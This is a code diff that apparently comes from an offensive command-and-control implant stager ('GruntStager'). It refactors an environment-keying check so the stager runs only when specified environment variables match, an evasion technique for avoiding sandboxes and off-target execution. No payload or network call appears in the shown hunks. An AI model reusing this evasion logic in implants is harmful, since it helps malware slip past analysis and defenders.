@@ -15,9 +15,10 @@ namespace GruntStager
         public GruntStager()
         {
             string Guardrails = @"{{REPLACE_GUARDRAILS}}";
-			if (EnvCheck(Guardrails)){
-            ExecuteStager();
-			}
+            
+            if (EnvCheck(Guardrails)){
+                ExecuteStager();
+            }
         }
         [STAThread]
         public static void Main(string[] args)
@@ -211,27 +212,21 @@ namespace GruntStager
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
 		
-         public static bool EnvCheck(string envString)
+        public bool EnvCheck(string envString)
         {
-            bool check = true;
             if (String.IsNullOrEmpty(envString))
             {
-                return check;
+                return true;
             }
             List<string> envSplitted = envString.Split(';').ToList<string>();
-
             foreach (string s in envSplitted)
             {
-                if (System.Environment.GetEnvironmentVariable(s.Split('=')[0]).Equals(s.Split('=')[1], StringComparison.InvariantCultureIgnoreCase))
+                if (!System.Environment.GetEnvironmentVariable(s.Split('=')[0]).Equals(s.Split('=')[1], StringComparison.InvariantCultureIgnoreCase))
                 {    
-                    check = check & true;
-                }
-                else
-                {
-                    return false;
+                   return false;
                 }
             }
-            return check;
+            return true;
         }
 		
 		
